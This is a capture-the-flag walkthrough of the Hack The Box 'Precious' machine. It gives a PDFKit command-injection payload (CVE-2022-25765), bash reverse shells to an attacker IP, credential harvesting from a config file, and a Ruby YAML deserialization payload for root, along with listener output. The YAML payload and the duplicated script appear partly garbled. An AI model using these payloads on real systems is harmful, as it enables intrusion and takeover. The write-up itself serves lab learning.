

## Scanning

we start with inital nmap scan  `nmap -A -F IP`  and founf two open ports  `22` and  `80` . 
The target page looks like this
![](/Hack-The-Box/Precious/img/1.png
![](/Hack-THe-Box/Precious/img/1.png)

Using  `Feroxbuster`  and  `wfuzz`  for hidden directry scan and subdomain enumeration but we got nothing usefull.

Going back to the web page, when we enterd a specific url in submit button it shows a flagged error 
`http://1p`
![](/Hack-The-Box/Precious/img/2.png

But trying the payload like this  `hTtp://IP` we just got the  `url`   printed as  `pdf`.
![](/Hack-The-Box/Precious/img/3.png

while chehcking about the pdf generator we found its generated through `PDFKit v 0.8.2`
After some reconnasence about PDFkit we founf this specific version is vulnerable to command injection `CVE-2022-25765`

For more details go through it `https://github.com/pdfkit/pdfkit/pull/509`

Now back to our machine through URL submit button enter our payload
```
http://ip/?name=$(id)
http://our_ip/?name=#{'%20 `bash -c "bash -i >&  /dev/tcp/our_ip/LPORT 0>&1"`'}
(For proper rev_shell)
```

```shell

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 9898 
listening on [any] 9898 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.189] 36898
bash: cannot set terminal process group (678): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ 

```

### Privilege Escalation

While reading `/etc/passwd` we found a more privileage user rather than `root`
```Bash
ruby@precious:/home$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
henry:x:1000:1000:henry,,,:/home/henry:/bin/bash
ruby:x:1001:1001::/home/ruby:/bin/bash
```

So we need to do vertical Privilege esclation.
While going through `/home` dir of `ruby` we found a dir namde `.bundle` . Readong the config file iniside the directory we found the creds for henry user.

### Root
User henry have sudo  so by running `sudo -l` we found something intersting
```shell
-bash-5.1$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

`update_dependencies.yml` contains `YAML.load` function which can be exploited using yaml deserialization.
```yml
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
root@precious:/home/henry# cat /opt/up
cat /opt/update_dependencies.rb 
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
 So using the following references we crafted a deserialization payload and expoit it.
 ```
 https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

https://ruby-doc.org/stdlib-2.5.1/libdoc/yaml/rdoc/YAML.html

https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml
```

#### Payload
```yml
---

- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
           read: 0
                header: "abc"
                  debug_output: &1 !ruby/object:Net::WriteAdapter
                       socket: &1 !ruby/object:Gem::RequestSet
                                sets: !ruby/object:Net::WriteAdapter
                                             socket: !ruby/module 'Kernel'
                                                          method_id: :system
                                                                   git_set:'bash -c "bash -i >& /dev/tcp/10.10.14.17/5656 0>&1"'
                                                                        method_id: :resolve
                                                                    
```

` sudo /usr/bin/ruby /opt/update_dependencies.rb` will give a root rev-shell

```shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 5656
listening on [any] 5656 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.189] 33234
root@precious:/home/henry# whoami
whoami
root
```

